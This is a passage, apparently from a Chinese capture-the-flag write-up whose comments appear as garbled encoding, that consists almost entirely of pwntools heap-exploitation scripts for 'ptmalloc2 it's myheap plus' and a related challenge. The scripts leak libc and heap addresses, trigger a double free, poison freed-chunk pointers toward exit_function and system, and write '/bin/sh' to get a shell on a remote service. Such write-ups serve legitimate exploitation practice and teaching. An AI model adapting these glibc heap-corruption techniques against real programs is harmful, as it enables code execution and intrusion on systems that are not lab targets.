<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token comment"># è§¦å‘double free</span>
delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token comment"># å°†fdæŒ‡å‘exit_functionåœ°å€å¤„</span>
add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>xor<span class="token operator">+</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">^</span>exit_function<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> getData<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token comment"># è·å–keyçš„å€¼</span>
res <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token comment"># è®¡ç®—å‡ºkeyåŠ å¯†åçš„åœ°å€</span>
manba <span class="token operator">=</span> remove_high_digits<span class="token punctuation">(</span>rol<span class="token punctuation">(</span><span class="token number">0x401700</span><span class="token operator">^</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> remove_high_digits<span class="token punctuation">(</span>rol<span class="token punctuation">(</span>system_addr<span class="token operator">^</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;key:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;heap_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_function:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_function<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0x42420</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b&quot;5&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;key:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;heap_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_function:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_function<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ptmalloc2-it-s-myheap-plus-orw-exit" tabindex="-1"><a class="header-anchor" href="#ptmalloc2-it-s-myheap-plus-orw-exit" aria-hidden="true">#</a> ptmalloc2 it&#39;s myheap plusï¼ˆorw+exitï¼‰</h2><blockquote><p>ç›¸å¯¹äºptmpåªæ˜¯å¤šäº†ä¸€ä¸ªsandboxé™åˆ¶ å°±å’ŒArahat0å¸ˆå‚…æ–‡ç« ä¸­çš„æµç¨‹ä¸€æ¨¡ä¸€æ · å¤šäº†ä¸€ä¸ªorwçš„åˆ©ç”¨ å¤§è‡´åŸç†éƒ½æ˜¯ç›¸åŒçš„</p><p>å€¼å¾—ä¸€æçš„æ˜¯æœ¬åœ°é€šäº†ä½†æ˜¯è¿œç¨‹æ‰“äº†å¥½ä¹…æ²¡é€šåé¢å‘ç°è¿œç¨‹ä¸è®©æˆ‘ä»¥rwçš„æ–¹å¼æ‰“å¼€flag è€Œæ˜¯åªå…è®¸æˆ‘ä»¥ræ–¹å¼æ‰“å¼€</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


<span class="token comment"># file_name = &quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">49979</span>

<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *main+34&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">&quot;b *main+34&quot;</span><span class="token punctuation">)</span>
    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;è¾“å…¥è¯·ç»§ç»­&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add_with_no_chunk</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk size: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;-1&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] please input chunk_idx: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk size: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk data: &quot;</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;----------\næ·»åŠ indexä¸º:</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">çš„chunk\n----------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk id: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;----------\nåˆ é™¤indexä¸º</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">çš„chunk\n----------&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;[?] Enter chunk id: &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res
<span class="token keyword">def</span> <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b&quot;114514&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">b&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span>  <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;éé¢„æœŸæ•°æ®&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data
<span class="token keyword">def</span> <span class="token function">rol</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># æ¨¡æ‹Ÿ 64 ä½æ— ç¬¦å·æ•´æ•°</span>
    mask <span class="token operator">=</span> <span class="token number">0xFFFFFFFFFFFFFFFF</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">&lt;&lt;</span> <span class="token number">0x11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>value <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> mask
<span class="token keyword">def</span> <span class="token function">remove_high_digits</span><span class="token punctuation">(</span>hex_num<span class="token punctuation">,</span> desired_length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    hex_str <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>hex_num<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># å°†åå…­è¿›åˆ¶æ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶å»æ‰å¼€å¤´çš„&quot;0x&quot;</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> desired_length<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># å¦‚æœå­—ç¬¦ä¸²é•¿åº¦å°äºç­‰äºæ‰€éœ€é•¿åº¦ï¼Œç›´æ¥è¿”å›</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">[</span><span class="token operator">-</span>desired_length<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># å¦åˆ™ï¼Œè¿”å›å»æ‰æœ€é«˜ä½åçš„å­—ç¬¦ä¸²</span>
<span class="token comment"># æ³„éœ²å‡ºchunk</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
<span class="token comment"># data = view(5)</span>
base_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2207216</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;base_libc&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token comment"># æ³„éœ²heap</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>
<span class="token comment"># print(&quot;base_libc&quot;,hex(base_libc))</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span>

<span class="token comment"># debug()</span>
<span class="token comment">#  0x5633731e9da0</span>
add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
base_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">7856</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">719</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token comment">#0x3b0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span>
fd <span class="token operator">=</span> <span class="token number">0x100</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_heap<span class="token operator">+</span><span class="token number">0xb20</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># index:10</span>
<span class="token comment"># æ„é€ fastbin</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
